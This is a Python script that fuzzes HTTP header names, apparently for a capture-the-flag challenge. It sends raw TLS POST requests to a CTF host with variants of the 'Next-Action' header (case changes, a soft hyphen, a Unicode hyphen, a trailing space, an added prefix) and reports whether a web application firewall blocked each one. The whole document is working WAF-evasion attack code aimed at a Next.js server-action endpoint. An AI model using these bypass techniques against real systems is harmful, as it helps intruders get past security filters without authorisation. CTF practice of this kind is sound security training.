#!/usr/bin/env python3
"""More header-name fuzzing to find a WAF bypass that Node.js still parses as 'next-action'."""
import socket, ssl

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"


def send(payload, label):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((HOST, PORT), timeout=15)
    s = ctx.wrap_socket(s, server_hostname=HOST)
    s.sendall(payload)
    chunks = []
    try:
        s.settimeout(5)
        while True:
            d = s.recv(8192)
            if not d:
                break
            chunks.append(d)
    except (TimeoutError, socket.timeout):
        pass
    finally:
        try: s.close()
        except: pass
    full = b"".join(chunks)
    head, _, body = full.partition(b"\r\n\r\n")
    status = head.split(b" ", 2)[1] if b" " in head else b"?"
    blocked = b"WAF" in head or b"WAF" in body
    body_len = len(body)
    return status, blocked, body_len, full


body = b"[]"

variants = [
    "Next-Action",
    "next-action",
    "Next-action",
    "NEXT-ACTION",
    "Next\xc2\xadAction",  # soft hyphen
    "Next‐Action",  # Unicode hyphen (might encode wrong)
    "Next-Action",  # baseline
    "X-Forwarded-Next-Action",
    "Next-Action;charset=utf-8",
    "next-action ",  # trailing space (lighttpd 400 expected)
]

for h in variants:
    try:
        h_bytes = h.encode("utf-8") if isinstance(h, str) else h
    except:
        continue
    req_bytes = (
        f"POST / HTTP/1.1\r\nHost: {HOST}\r\n".encode()
        + h_bytes + f": {ACTION_ID}\r\n".encode()
        + f"Content-Type: text/plain\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode()
        + body
    )
    try:
        status, blocked, body_len, full = send(req_bytes, h)
        print(f"{h!r:50s} -> status={status.decode()} blocked={blocked} body_len={body_len}")
    except Exception as e:
        print(f"{h!r:50s} -> ERR {e}")
